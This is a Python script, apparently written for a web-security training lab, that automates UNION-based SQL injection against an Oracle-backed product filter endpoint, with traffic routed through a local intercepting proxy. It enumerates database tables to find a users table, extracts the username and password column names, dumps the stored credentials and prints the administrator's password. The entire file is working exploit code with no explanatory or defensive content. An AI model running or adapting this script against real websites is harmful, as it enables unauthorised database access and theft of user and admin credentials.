import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':"http://127.0.0.1:8080",'https':"http://127.0.0.1:8080"}

def perform_request(url,sql_payload):
    path='/filter?category=Lifestyle'
    res=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    return res.text


def sqli_users_table(url):
    sql_payload="' UNION SELECT table_name,NULL FROM all_tables--"
    res=perform_request(url,sql_payload)
    soup=BeautifulSoup(res,'html.parser')
    users_table=soup.find(string=re.compile('^USERS\.*'))
    if users_table:
        return users_table
    else:
        return False
    
def sqli_users_columns(url,users_table):
    sql_payload="' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '%s'--"%users_table
    res=perform_request(url,sql_payload)
    soup=BeautifulSoup(res,'html.parser')
    username_column=soup.find(string=re.compile('.*USERNAME.*'))
    password_column=soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column,password_column

def sqli_admin_cred(url,users_table,username_column,password_column):
    sql_payload="' UNION select %s, %s from %s--" %(username_column,password_column,users_table)
    res=perform_request(url,sql_payload)
    soup=BeautifulSoup(res,'html.parser')
    admin_password=soup.find(string='administrator').parent.find_next('td').contents[0]
    return admin_password


if __name__=='__main__':
    try:
        url=sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <ur>'% sys.argv[0])
        print('[-] Example: %s www.example.com'%sys.argv[0])

    print("Looking for the users tables..")
    users_table=sqli_users_table(url)
    if users_table:
        print('[+] Users table found: %s'%users_table)
        username_column,password_column=sqli_users_columns(url,users_table)
        if username_column and password_column:
            print("[+] Found the username column name: %s"%username_column)
            print("[+] Found the password column name: %s"%password_column)

            admin_password=sqli_admin_cred(url,users_table,username_column,password_column)
            if admin_password:
                print("[+] The administrator password is %s"%admin_password)
            else:
                print("[-] Did not Find Administrator password")
        else:
            print("Did not find the username and/or the password columns")
    else:
        print("[-] Users Table not found")

